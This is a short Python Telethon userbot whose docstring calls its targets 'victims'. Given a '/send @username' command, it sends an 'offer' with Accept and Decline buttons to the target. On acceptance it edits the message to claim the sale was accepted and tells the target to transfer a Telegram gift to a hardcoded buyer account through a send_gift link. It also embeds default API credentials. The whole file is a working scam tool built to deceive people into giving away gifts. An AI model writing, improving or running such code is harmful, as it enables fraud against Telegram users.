"""
Userbot. Ответь на сообщение бота командой /send @жертва
"""

import os
import asyncio
from telethon import TelegramClient, events, Button

API_ID = int(os.environ.get("API_ID", "39450533"))
API_HASH = os.environ.get("API_HASH", "52a50527f3fd4d9c1cba720590e618fe")
BUYER = os.environ.get("BUYER", "defqux")
SESSION = "session"

print("Импорт завершён", flush=True)
client = TelegramClient(SESSION, API_ID, API_HASH)


@client.on(events.NewMessage(outgoing=True, pattern=r'(?i)^/send'))
async def on_send(event):
    print(f"Получил /send: {event.raw_text}", flush=True)
    if not event.is_reply:
        await event.reply("Ответь командой /send @username на сообщение с оффером")
        return
    reply = await event.get_reply_message()
    text = reply.raw_text or ""
    if not text:
        await event.reply("Нет текста")
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply("Формат: /send @username")
        return
    target = parts[1].strip()
    try:
        entity = await client.get_entity(target)
    except Exception as e:
        await event.reply(f"Не нашёл: {e}")
        return
    buttons = [[Button.inline("✗ Отклонить", b"dec"), Button.inline("✓ Принять", b"acc")]]
    await client.send_message(entity, text, buttons=buttons)
    await event.delete()


@client.on(events.CallbackQuery)
async def on_cb(event):
    if event.data == b"dec":
        await event.edit("Предложение отклонено.", buttons=None)
        await event.answer("Отклонено")
    elif event.data == b"acc":
        await event.edit(
            "Предложение о продаже успешно принято.\n\nПередайте подарок покупателю.",
            buttons=[[Button.url("Передать", "tg://send_gift?to=defqux")]]
        )
        await event.answer("Принято")


async def main():
    print("СТАРТ", flush=True)
    await client.start()
    print("Userbot запущен.", flush=True)
    await client.run_until_disconnected()


if __name__ == "__main__":
    print("Запуск main", flush=True)
    asyncio.run(main())
